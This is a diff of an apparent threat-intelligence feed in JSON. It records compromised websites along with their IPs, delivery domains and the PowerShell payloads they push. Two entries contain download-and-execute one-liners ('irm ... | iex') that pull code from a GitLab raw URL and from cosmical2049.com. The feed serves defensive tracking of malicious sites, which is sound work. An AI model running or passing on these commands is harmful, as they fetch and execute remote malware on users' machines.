@@ -1,5 +1,25 @@
 [
   {
+    "UrlDomain": "8cdigit.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "184.168.108.26"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwnxm1t71xj30oml4e26u03q",
+    "ScannedAt": "2026-11-19T19:17:02.747000+00:00"
+  },
+  {
     "UrlDomain": "al-sorour.com.bd",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -18785,26 +18805,5 @@
     ],
     "ReportId": "cmw9qc8do03h30omlv9zigk19",
     "ScannedAt": "2026-11-09T20:44:40.970000+00:00"
-  },
-  {
-    "UrlDomain": "imretrades.com",
-    "DeliveryUrl": [
-      "cloudeccentric.cc",
-      "yaponovosh.org",
-      "cosmical2049.com"
-    ],
-    "PayloadUrl": [
-      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
-    ],
-    "IP": [
-      "141.193.213.10"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://cosmical2049[.]com/lom3/0ad7a0bdad0aa13d' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex",
-    "ResolvedDownloadUrl": [
-      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
-    ],
-    "ReportId": "cmw9n6mj101wv0oml32xyr1jx",
-    "ScannedAt": "2026-11-09T19:16:20.516000+00:00"
   }
 ]
